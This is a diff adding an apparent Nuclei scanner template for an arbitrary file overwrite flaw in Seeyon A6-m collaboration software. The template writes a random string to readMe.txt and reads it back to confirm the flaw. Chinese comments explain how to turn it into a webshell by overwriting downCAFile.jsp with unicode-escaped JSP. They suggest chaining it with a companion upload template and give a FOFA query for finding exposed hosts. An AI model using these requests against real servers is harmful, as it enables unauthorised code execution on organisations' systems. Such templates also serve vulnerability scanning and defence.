@@ -1,0 +1,64 @@
+id: seeyon-a6-m-action-arbitrary-filewrite
+
+info:
+  name: 致远A6-m协同管理软件任意文件覆盖写入上传getshell
+  author: hugh
+  severity: critical
+  description: 致远A6-m协同管理软件任意文件覆盖写入上传getshell
+  reference:
+    - none
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: 'icon_hash="277494963"'
+  tags: seeyon,oa,fileuplaod,filewrite
+
+http:
+  - raw:        
+      - |
+        GET /yyoa/portal/style/controller/operaFileActionController.jsp?path=/workManage/readMe.txt&type=txt&fileop=save&context={{randstr}} HTTP/1.1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+        Accept: */*
+        Cookie: JSESSIONID=8AF8525D562E345BD18FA00F6E28FFAD
+        Connection: close
+
+      - |
+        GET /yyoa/workManage/readMe.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains((body_2), '{{randstr}}')"
+
+# 此漏洞为任意文件写入覆盖，前提是写入覆盖的文件要是已经存在的，此漏洞可以配合 seeyon-a6-m-doupload-fileupload.yaml 来实现文件上传+文件写入利用链
+
+# 利用请将 19 行修改为：
+# GET /yyoa/portal/style/controller/operaFileActionController.jsp?path=/downCAFile.jsp&type=jsp&fileop=save&context=<%\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0068\u0065\u006c\u006c\u006f\u0020\u0077\u006f\u0072\u006c\u0064\u0022\u0029\u003b%> HTTP/1.1 HTTP/1.1
+
+# 将 27行 修改为：
+# GET /yyoa/downCAFile.jsp HTTP/1.1
+
+# 因为覆盖的是downCAFile.jsp 连接webshell成功后请将文件还原
+
+# downCAFile.jsp 源文件内容：
+# <%@ page contentType="text/html;charset=GBK" %>
+# <%@ page language="java" %>
+# <%@ page session="true" %>
+# <%@ page isThreadSafe="true" %>
+# <%@ page errorPage="../error/error.jsp" %>
+# <%@ page import="net.btdz.oa.a6service.*,net.btdz.oa.tools.OAAppInfo" %>
+# <%
+#     String getUrl = OAAppInfo.getInstance().getJSPRootPath() + "ssl/";
+#     TDownloadFile df = new TDownloadFile();
+#     int typeNum = df.getDownloadFile(getUrl,"ca.crt","ca.crt",response);
+#     if(typeNum != 0){
+#  out.println("<script>");
+#  out.println("alert(\"未找到根证书，请与管理员联系！\");");
+#  out.println("self.close();");
+#  out.println("</script>");
+#     }
+# %>
